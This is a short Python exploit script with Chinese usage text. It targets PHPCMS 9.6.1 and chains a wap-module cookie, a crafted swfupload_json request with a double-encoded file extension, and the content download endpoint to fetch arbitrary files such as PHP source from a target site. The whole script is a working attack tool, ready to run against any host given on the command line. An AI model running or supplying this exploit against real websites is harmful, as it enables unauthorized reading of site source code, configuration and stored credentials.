#!/usr/bin/python3
#coding=utf-8
import sys
import requests

def main():
    if len(sys.argv)<3:
        print("第一个参数为网站地址")
        print("第二个参数为要下载的文件地址(不加后缀)，具体地址参照phpcms结构")
        print("例子: python3 phpcms961.py http://www.phpcms961.com ./phpcms/base")
        sys.exit()

    host = sys.argv[1]
    url1 = host + "/index.php?m=wap&c=index&a=init&siteid=1"
    cookies = requests.get(url1).cookies
    for cookie in cookies:
        if '_siteid' in cookie.name:
            #获取siteid赋值给userid_flash
            userid_flash = cookie.value

    file_dir = sys.argv[2]
    url2 = host + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3D"+file_dir+"%26f%3D.p%25253chp"
    post_data = {'userid_flash':userid_flash}
    cookies = requests.post(url = url2,data=post_data).cookies
    for cookie in cookies:
        if 'att_json' in cookie.name:
            #获取att_json
            att_json = cookie.value

    url3 = host + "/index.php?m=content&c=down&a=init&a_k=" + att_json
    print(url3)
if __name__ == '__main__':
    main()

